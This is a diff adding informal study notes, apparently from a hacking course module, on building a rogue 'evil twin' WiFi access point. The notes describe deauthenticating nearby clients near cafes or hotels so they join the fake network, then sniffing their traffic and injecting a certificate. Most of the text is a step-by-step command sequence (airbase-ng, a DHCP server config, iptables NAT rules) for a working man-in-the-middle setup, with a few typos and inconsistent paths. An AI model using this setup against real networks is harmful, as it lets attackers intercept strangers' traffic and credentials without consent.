@@ -1,0 +1,53 @@
+Rouge
+    airbase-ng can make a fake AP!
+    dchpd3 is a DHCP server!
+        we can make a fake DHCP server as a MiTM attack to intercept all clients' network activity.
+            we only forward their traffic to the network as always, but we can Sniff all un-encrypted packets and even if they don't be careful about their activities we can inject our Certificate ;)
+            and we are routing to the Internet via Ethernet ;)
+    Evil Twin is when we are emulating the same AP, but stronger to some clients or doing Deauth attack ;)
+        like creating a fake WIFI near a cafe or hotel ;)
+        now, you can get new clients connected to do all we described above ;)
+        even we can send a Deauth broadcast to make them a force to reconnect. then some of them are near to us so connect to our fake WIFI :D
+            that's it!
+    MiTM attack
+    Commands
+        sudo apt install dhcp3-server
+            installing a DHCP server to give the clients an IP address after running a fake AP ;)
+        mv /etc/dhcp3/dhcpd.conf /etc/dhcp3/dhcpd.conf.backup
+            renaming the config file of the DHCP server.
+        nano /etc/dhcp3/dhcpd.conf
+            ddns-update-style ad-hoc;
+            default-lease-tme 600;
+            max-lease-time 7200;
+            subnet 192.168.2.0 netmask 255.255.255.0 {
+                option subnet-mask 255.255.255.0;
+                option broadcast-address 192.168.2.255;
+                option routers 192.168.2.1;
+                option domain-name-servers 8.8.8.8;
+                range 192.168.2.51 192.168.2.100;
+            }
+        airmon-ng start <interface>
+            start monitoring mode of the interface
+        airodump-ng <monitoring enabled interface>
+            watching the network to find out what networks we have and which one is better to make a fake AP for it ;)
+        airbase-ng --essid <new AP SSID. like "Free HotSpot"> -c <channel number> <monitoring enabled interface>
+            creating an AP with the name we mentioned as an interface! (like at0)
+        ifconfig at0 up
+            make it up
+        ifconfig at0 <IP address. like 192.168.2.1/24>
+            giving it an IP address. as you remember, we configured this IP address as default Gateway!
+        route add -net <network IP. like 192.168.2.0> netmask <netmask. like 255.255.255.0> gw <gateway. like 192.168.2.1>
+            adding a route to forward all packets is in this network to providing the Internet to all connected clients ;)
+        dhcpd3 -cf /etc/dhcpd3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid <AP interface. like at0>
+            run the DHCP server
+        /etc/init.d/dhcp3-server start
+            starting the DHCP service
+        doing some works to forwarding all clients packets:
+            iptables --flush
+            iptables --table nat --flush
+            iptables --delete-chain
+            iptables --table nat --delete-chain
+            iptables --table nat --append POSTROUTING --out-interface <Internet interface. like eth0> -j MASQUERADE
+            iptables --append FORWARD --in-interface <fake AP interface. like at0> -j ACCEPT  
+            echo 1 > /proc/sys/net/ipv4/ip_forward
+    Module 95 of CBT
